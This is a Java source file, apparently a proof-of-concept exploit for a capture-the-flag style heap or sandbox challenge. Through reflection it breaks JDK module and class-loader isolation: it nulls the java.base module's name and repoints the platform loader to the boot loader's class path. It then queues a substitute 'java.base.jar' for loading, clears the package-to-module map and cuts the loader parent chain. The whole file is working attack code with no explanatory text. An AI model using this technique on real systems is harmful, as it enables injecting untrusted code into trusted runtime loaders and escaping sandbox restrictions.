package exp;

import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import java.net.URL;

interface Action {
  public void run() throws Exception;
}

public class exp {
  static ArrayList<URL> ucp_path;
  static ArrayDeque<URL> ucp_unopened;
  static URL exp;

  public static Field getField(Class<?> cls, String name) throws Exception {
    Field fld = cls.getDeclaredField(name);
    fld.setAccessible(true);
    return fld;
  }

  public static <E> E getStaticFieldVal(Class<?> cls, String name) throws Exception {
    return (E)getField(cls, name).get(null);
  }

  public static <E> E getFieldVal(Object obj, String name) throws Exception {
    return getFieldVal(obj, obj.getClass(), name);
  }

  public static <E> E getFieldVal(Object obj, Class<?> cls, String name) throws Exception {
    return (E)getField(cls, name).get(obj);
  }

  public static void main(String[] args) throws Exception {

    try {
      Class.forName("Test");
      throw new AssertionError("forName() should fail!");
    } catch (Exception e) {
      // Does nothing
    }

    Field fldName = Module.class.getDeclaredField("name");
    fldName.setAccessible(true);
    fldName.set(Class.class.getModule(), null);


    Class<?> clsLoaders = Class.forName("jdk.internal.loader.ClassLoaders");
    Class<?> clsLoader = Class.forName("jdk.internal.loader.BuiltinClassLoader");
    ClassLoader bootLoader = getStaticFieldVal(clsLoaders, "BOOT_LOADER");
    ClassLoader platLoader = ClassLoader.getPlatformClassLoader();
    ClassLoader appLoader = exp.class.getClassLoader();
    Field fld_ucp = getField(clsLoader, "ucp");

    Object ucp = fld_ucp.get(bootLoader);
    ArrayList<Object> ucp_loaders = getFieldVal(ucp, "loaders");

    fld_ucp.set(platLoader, ucp);
//    Object ucp = fld_ucp.get(appLoader);

    ucp_unopened = getFieldVal(ucp, "unopenedUrls");
    ucp_unopened.add(new URL("file:///home/henry/git/problems/jheap/java.base_exp/java.base.jar"));

    // Wipe clean the packageToModule
    Map<String, Object> packageToModule = getStaticFieldVal(clsLoader, "packageToModule");
    packageToModule.clear();

//    System.out.println("HI");

    Action nerf = new Action() {
      public void run() throws Exception {
        getField(clsLoader, "parent").set(platLoader, null);
      }
    };

    Action go = new Action() {
      public void run() throws Exception {
        nerf.run();
        System.getenv("SDFSF");
        System.out.println("******************");
//        if (System.in != null)
          System.in.read();
        //System.out.println("BYE");
      }
    };

    // Let 'er rip!
    go.run();
//    nerf.run();
    System.exit(0);

  }
}
